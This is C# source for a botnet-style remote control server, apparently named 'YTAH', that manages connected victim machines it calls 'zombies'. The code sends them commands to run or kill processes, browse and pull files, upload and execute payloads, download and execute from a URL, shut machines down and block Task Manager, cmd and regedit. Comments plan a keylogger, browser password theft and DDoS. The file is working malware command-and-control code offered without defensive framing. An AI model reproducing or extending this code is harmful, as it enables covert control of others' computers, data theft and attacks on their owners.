using MySql.Data.MySqlClient;
using System;
using System.Collections.Generic;
using System.IO;
using System.Net;
using System.Net.Sockets;
using System.Text;
using System.Threading;


namespace WOA_DEVServer
{
    public class Program
    {
        static readonly object _lock = new object();
        static readonly Dictionary<int, TcpClient> list_clients = new Dictionary<int, TcpClient>();
        public static bool inadminmode = false;
        public  enum type{
            ERROR,
            CLIENT,
            INFO,
            QUESTION
            
        }
        public static void Log(string text, type t)
        {
            string final = "";
            switch (t)
            {
                case type.ERROR:
                    Console.ForegroundColor = ConsoleColor.Red;
                    final = "[FAIL] - " + text;
                    break;
                case type.INFO:
                    Console.ForegroundColor = ConsoleColor.White;
                    final = "[*] - " + text;
                    break;
                case type.CLIENT:
                    Console.ForegroundColor = ConsoleColor.Cyan;
                    final = "[CLIENT] - " + text;
                    break;
                case type.QUESTION:
                    Console.ForegroundColor = ConsoleColor.Yellow;
                    final = "[?] - " + text;
                    break;

            }
            Console.WriteLine(final);
            Console.ForegroundColor = ConsoleColor.White;
        }
        public static User selecteduser;
        public static bool isglobal = true;
        public static void SendCommand(string command)
        {


            
            switch (command)
            {
                case "startproc":
                    Log("Enter process name (Exemple : http://google.com | calc.exe)", type.QUESTION);
                    string process = Console.ReadLine();
                    StartProcess(process);
                    Log("Command Sent", type.INFO);
                    break;
                case "grights":
                    if(users.Count > 0)
                    {
                        Log("Checking if user is admin...", type.INFO);
                        if (isglobal == true)
                        {
                            broadcast("grights");
                        }
                        else
                        {
                            NetworkStream nss = selecteduser.client.GetStream();
                            byte[] bts = Encoding.UTF8.GetBytes("grights");
                            nss.Write(bts, 0, bts.Length);
                        }
                    }
                    else
                    {
                        Log("No zombies...", type.ERROR);
                    }
                    break;
                case "ls":
                    if (isglobal == true)
                    {
                        Log("Command not available in global !", type.ERROR);
                    }
                    else
                    {
                        NetworkStream nss = selecteduser.client.GetStream();
                        byte[] bts = Encoding.UTF8.GetBytes("ls");
                        nss.Write(bts, 0, bts.Length);
                    }
                    break;
                case "clear":
                    Console.Clear();
                    break;
                case "reconnect":
                    users.Clear();
                    broadcast("rconnect");
                    break;
                case "changelport":
                    setport:
                    Log("New listening port : ", type.QUESTION);
                    string newport = Console.ReadLine();
                    try
                    {
                        Properties.Settings.Default.port = int.Parse(newport);
                        Properties.Settings.Default.Save();
                    }
                    catch
                    {
                        goto setport;
                    }
                    Log("Success, rebooting !",type.INFO);
                    Thread.Sleep(1000);
                    Environment.Exit(0);
                    break;
                case "listdisks":
                    if (isglobal == true)
                    {
                        Log("Command not available on global, please select a user !",type.ERROR);
                    }
                    else
                    {
                        NetworkStream nss = selecteduser.client.GetStream();
                        byte[] bts = Encoding.UTF8.GetBytes("GD");
                        nss.Write(bts, 0, bts.Length);
                    }
                    break;
                case "ld":
                    if (isglobal == true)
                    {
                        Log("Command not available in global !", type.ERROR);
                    }
                    else
                    {
                        NetworkStream nss = selecteduser.client.GetStream();
                        byte[] bts = Encoding.UTF8.GetBytes("ld");
                        nss.Write(bts, 0, bts.Length);
                    }
                    break;
                case "disable":
                    if (isglobal == true)
                    {
                        broadcast("disable");
                    }
                    else
                    {
                        NetworkStream nss = selecteduser.client.GetStream();
                        byte[] bts = Encoding.UTF8.GetBytes("disable");
                        nss.Write(bts, 0, bts.Length);
                    }
                    break;
                case "enable":
                    if (isglobal == true)
                    {
                        broadcast("enable");
                    }
                    else
                    {
                        NetworkStream nss = selecteduser.client.GetStream();
                        byte[] bts = Encoding.UTF8.GetBytes("enable");
                        nss.Write(bts, 0, bts.Length);
                    }
                    break;
                case "mt":
                    Log("Enter a path: (Exemple : C:/Folder1/Folder2)", type.INFO);
                    string folder = Console.ReadLine();
                    if (isglobal == true)
                    {
                        Log("Command not available in global !", type.ERROR);
                    }
                    else
                    {
                        NetworkStream nss = selecteduser.client.GetStream();
                        byte[] bts = Encoding.UTF8.GetBytes("mt|" + folder);
                        nss.Write(bts, 0, bts.Length);
                    }
                    break;

                case "lu": //listusers
                    if (users.Count > 0)
                    {
                        foreach (User u in users)
                        {
                            Log(u.poste + "|" + u.username, type.INFO);
                        }
                    }
                    else
                    {
                        Log("No zombies...", type.ERROR);
                    }
                    break;
                case "uploadfile":
                    
                    Log("Enter the path of the file to upload :", type.QUESTION);
                    string path = Console.ReadLine();
                    Log("Execute after uploading ? [Y/N]", type.QUESTION);
                    string answer = Console.ReadLine();
                    switch (answer)
                    {
                        case "y":

                            byte[] b = Encoding.UTF8.GetBytes("DEX");
                            try
                            {
                                byte[] file = File.ReadAllBytes(path);
                                if (isglobal == true)
                                {
                                    broadcast(Encoding.UTF8.GetString(b));
                                    broadcast(Encoding.UTF8.GetString(file));
                                    
                                }
                                else
                                {
                                    NetworkStream nss = selecteduser.client.GetStream();
                                    nss.Write(b, 0, b.Length);
                                    nss.Write(file, 0, file.Length);
                                }
                            }
                            catch
                            {

                            }

                            break;
                        case "n":
                            //upload
                            break;
                        case "Y":
                            //uploadandexecute
                            break;
                        case "N":
                            //upload
                            break;
                        default:
                            Log("File upload cancel !", type.ERROR);
                            break;
                    }
                    break;
                case "su":
                    if(users.Count != 0)
                    {
                        int found = 0;
                        Log("Select user:", type.INFO);
                        foreach (User u in users)
                        {
                            Log(u.poste + "|" + u.username, type.INFO);
                        }
                        string t = Console.ReadLine();
                        foreach (User u in users)
                        {
                            if (t == u.username)
                            {
                                found = 1;
                                selecteduser = u;
                                isglobal = false;
                                try
                                {
                                    NetworkStream ns = selecteduser.client.GetStream();

                                }
                                catch
                                {
                                    Log("Can't select, user isn't connected. - Removing from the list", type.ERROR);
                                    users.Remove(selecteduser);
                                }
                                break;

                            }                                                 
                        }
                        if (found == 1)
                        {
                            // a trouvé
                            Log(selecteduser.username + " Selected !", type.INFO);
                        }
                        else
                        {
                            Log(t + " Is not in the list !", type.ERROR);
                        }
                    }
                    else
                    {
                        Log("No zombies ...", type.ERROR);
                    }  
                    break;
                case "df":
                    if (isglobal == true)
                    {
                        Log("Command not available in global !", type.ERROR);
                    }
                    else
                    {
                        Log("Path of the file to download (Ex: C:/Users/Alex/Desktop/file.txt)", type.QUESTION);
                        string dfpath = Console.ReadLine();
                        string[] splitter = dfpath.Split('.');
                        filename = splitter[1];
                        NetworkStream nss = selecteduser.client.GetStream();
                        byte[] bb = Encoding.UTF8.GetBytes("DF|" + dfpath);
                        nss.Write(bb, 0, bb.Length);
                    }
                    break;

                case "listprocess":
                    if(isglobal == true)
                    {
                        Log("Command not available in global !", type.ERROR);
                    }
                    else
                    {
                        Log("Liste des processus de " + selecteduser.username, type.INFO);
                        NetworkStream nss = selecteduser.client.GetStream();
                        byte[] bts = Encoding.UTF8.GetBytes("LP");
                        nss.Write(bts, 0, bts.Length);
                    }
                    break;
                
                case "setglobal":
                    Log("All users selected", type.INFO);
                    isglobal = true;
                    break;
                case "killproc":
                    Log("Process name : ", type.QUESTION);
                    string ts = Console.ReadLine();
                    KillProcess(ts);
                    break;
                case "update":
                    broadcast("shut");
                    break;
                case "help":
                    Log("Commands:", type.INFO);
                    Log("setglobal <- Selected all users to send a command", type.INFO);
                    Log("su <- Select one user", type.INFO);
                    Log("lu <- List all users", type.INFO);
                    Log("grights <- Does the user have admin rights? ", type.INFO);
                    Log("startproc <- Start process", type.INFO);
                    Log("disable <- Allow taskmanager|cmd|regedit access", type.INFO);
                    Log("update <- shutdown selected pc", type.INFO);
                    Log("mt <- Move to path", type.INFO);
                    Log("ld <- list directories", type.INFO);
                    Log("ls <- list files", type.INFO);
                    Log("clear <- clear console", type.INFO);
                    Log("uploadfile <- upload a file [WIP]", type.INFO); // WIP
                    Log("df <- download a file [WIP]", type.INFO);
                    Log("changelport <- change listening port (needs a server reboot)",type.INFO);
                    //freeze la souris
                    //avoir partage ecran
                    //avoir controle souris & keyboard
                    // upload & execute
                    // keylogger avec console seulement sur appuie entrer
                    // recup mdp navigateur
                    // DDOS


                    Log("killproc <- kill a process", type.INFO);
                    Log("listprocess <- list all running processes", type.INFO);
                    break;

            }
        }
        public static void Main(string[] args)
        {
            Console.Title = "YTAH - Server [0]";
            setport:
 
            int port = 5000;
            string lport = "";
            if (Properties.Settings.Default.port == 0)
            {
                Log("First open, please enter the listening port : ", type.ERROR);
                lport = Console.ReadLine();
                if (lport != "")
                {
                    try
                    {
                        port = int.Parse(lport);
                        Properties.Settings.Default.port = port;
                        Properties.Settings.Default.Save();
                    }
                    catch (Exception ex)
                    {
                        Log(ex.ToString(), type.ERROR);
                        goto setport;
                    }
                }
            }
            else
            {
                port = Properties.Settings.Default.port;
            }

            Log("Starting server", type.INFO);
            new Thread(() =>
            {
                Handle(port); 
            }).Start();
           

            while (true)
            {
                string command = Console.ReadLine();
                SendCommand(command);
            }

        }
        public static List<User> users = new List<User>();
        public static void StartProcess(string processname)
        {
            if(isglobal == true)
            {
                broadcast("SP|" + processname);
            }
            else { 
            NetworkStream ns = selecteduser.client.GetStream();
            byte[] bs = Encoding.UTF8.GetBytes("SP|" + processname);
            ns.Write(bs, 0, bs.Length);               
            }
        }
        public static void KillProcess(string processname)
        {
            if (isglobal == true)
            {
                broadcast("KP|" + processname);
            }
            else
            {

                NetworkStream ns = selecteduser.client.GetStream();
                byte[] bs = Encoding.UTF8.GetBytes("KP|" + processname);
                ns.Write(bs, 0, bs.Length);
            }
        }
        public static void Handle(int port)
        {

            int count = 1;
            TcpListener ServerSocket = new TcpListener(IPAddress.Any, port);
            try
            {

                ServerSocket.Start();
                Console.WriteLine();
                Console.WriteLine(@"
Y)    yy T)tttttt   A)aa   H)    hh 
 Y)  yy     T)     A)  aa  H)    hh 
  Y)yy      T)    A)    aa H)hhhhhh 
   Y)       T)    A)aaaaaa H)    hh 
   Y)       T)    A)    aa H)    hh 
   Y)       T)    A)    aa H)    hh ", Console.ForegroundColor = ConsoleColor.Red);
                Console.WriteLine();
                Console.ForegroundColor = ConsoleColor.White;
                Log("Listening on port " + Properties.Settings.Default.port.ToString() + ", waiting for commands !", type.INFO);
            }
            

            catch (Exception e)
            {
                Log(e.ToString(), type.ERROR);
            }
            while (true)
            {
                TcpClient client = ServerSocket.AcceptTcpClient();
                lock (_lock) list_clients.Add(count, client);
                Thread t = new Thread(handle_clients);
                t.Start(count);
                count++;
            }
        }
        public static bool dbonline = false;
        public static string filename = "";
        public static int onlineplayers = 0;
        public static string GetCommandName(string command)
        {
            string[] splitter = command.Split('|');
            string commandID = splitter[0];
            string final = "";
            switch (commandID)
            {
                case "shut":
                    final = "SHUTDOWN";
                    break;
                case "sm":
                    final = "POPUP";
                    break;
                case "disable":
                    final = "BLOCKACCESS";
                    break;
                case "SP":
                    final = "STARTPROCESS";
                    break;
                case "KP":
                    final = "KILLPROCESS";
                    break;
                case "LP":
                    final = "LISTPROCESS";
                    break;
                case "enable":
                    final = "AUTHORIZEACCESS";
                    break;
                case "mt":
                    final = "CHANGEPATH";
                    break;

                
                
            }
            return final;
        }
        public static void handle_clients(object o)
        {

            int id = (int)o;
            TcpClient client;

            lock (_lock) client = list_clients[id];
         
            while (true)
            {
                onlineplayers = users.Count;
             Console.Title = "YTAH - Server [" + onlineplayers.ToString() + "]";
              try {
                    bool fileincoming = false;
                    bool logavailable = true;
                    NetworkStream stream = client.GetStream();
                    byte[] buffer = new byte[1024];
                    int byte_count = stream.Read(buffer, 0, buffer.Length);
                    if (byte_count == 0)
                    {
                        break;
                    }

                    string data = Encoding.UTF8.GetString(buffer, 0, byte_count);
                    inadminmode = true;
                    if (data.Contains("SC"))//SC;adminID;command (tcp version)
                    {
                        string[] splitter = data.Split(';');
                        string sc = splitter[0];
                        string adminID = splitter[1];
                        string command = splitter[2];
                        Admin iS = new Admin(null, null);
                        foreach(Admin a in Admin.admins)
                        {
                            if(a.username == adminID)
                            {
                                iS = a;
                              //  Log(a.username + " trouvé ! ", type.INFO);
                                try
                                {
                                    stream = a.selected.client.GetStream();
                                    byte[] b = Encoding.UTF8.GetBytes(command);
                                    stream.Write(b, 0, b.Length);
                                    
                                }
                                catch(Exception ex)
                                {
                                    Log(ex.ToString(), type.ERROR);
                                }
                            }

                        }
                        try
                        {
                            string comID = "";
                            if (!command.Contains("mt"))
                            {
                                comID = GetCommandName(command);
                            }
                           
                            
                            LogAdmins("ACTIVITY|"  + adminID + " A envoye [" + comID + "] sur " + iS.selected.username, stream, iS.client);
                            Log("Command Sent by " + adminID,type.INFO);
                        }
                        catch(Exception ex)
                        {
                           // Log(ex.ToString(), type.ERROR);
                        }
                    }
                     if (data.Contains("INF"))
                    {
                        fileincoming = true;
                        logavailable = false;
                    }
                    else if (data.Contains("ENDINF"))
                    {
                        fileincoming = false;
                        logavailable = true;
                    }
                    else if(fileincoming == false)
                     {
                        if (data.Contains("NC"))
                        {
                            //Log("NC", type.ERROR);
                            int todo = 0;
                            string[] splitter = data.Split('|');
                            User u = new User(splitter[2], splitter[1], client, splitter[3], splitter[4]);
                            foreach (User a in users)
                            {
                                if (a.username == u.username)
                                {
                                    todo = 1;
                                    a.client = client;
                                }

                            }
                            if (todo == 0)
                            {
                                users.Add(u);
                            }
                            string allusers = "USERS;";
                            if (users.Count > 0)
                            {

                                foreach (User us in users)
                                {
                                    allusers = allusers + us.poste + "|" + us.username + "|" + us.admin + "|" + us.ip + ";";
                                }
                            }
                            else
                            {
                                allusers = "empty";
                            }
                            foreach (Admin a in Admin.admins)
                            {
                                if (todo == 0)
                                {
                                    stream = a.client.GetStream();
                                    byte[] tosend = Encoding.UTF8.GetBytes(allusers);
                                    stream.Write(tosend, 0, tosend.Length);
                                }
                            }
                        }

                        else
                        {
                            if(logavailable == true)
                            {
                                Log(data, type.CLIENT);
                            }
                            
                        }
                    }
                    else
                    {
                     var output = File.Create(Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + @"\YTAHOutput"); 
                        output.Write(buffer, 0, buffer.Length);
                        logavailable = true;
                    }

                }

                catch
                {
                    break;
                }
            }
            lock (_lock) list_clients.Remove(id);
            client.Client.Shutdown(SocketShutdown.Both);
            client.Close();
        }
        public static void LogAdmins(string msg, NetworkStream stream, TcpClient client)
        {
            foreach (Admin a in Admin.admins)
            {
                
                    try
                    {
                        stream = a.client.GetStream();
                        byte[] b = Encoding.UTF8.GetBytes("LOG|" + msg);
                        stream.Write(b, 0, b.Length);
                    }
                    catch
                    {

                    }
                
            }
        }
        public static void SendDownload(string url)
        {
            broadcast("DX|" + url);//Download & Execute
        }

        public static void broadcast(string data)
        {
            byte[] buffer = Encoding.UTF8.GetBytes(data + Environment.NewLine);

            lock (_lock)
            {
                foreach (TcpClient c in list_clients.Values)
                {
                    NetworkStream stream = c.GetStream();
                    stream.Write(buffer, 0, buffer.Length);
                    Log("Sent", type.INFO);
                }
            }
        }




    }
}
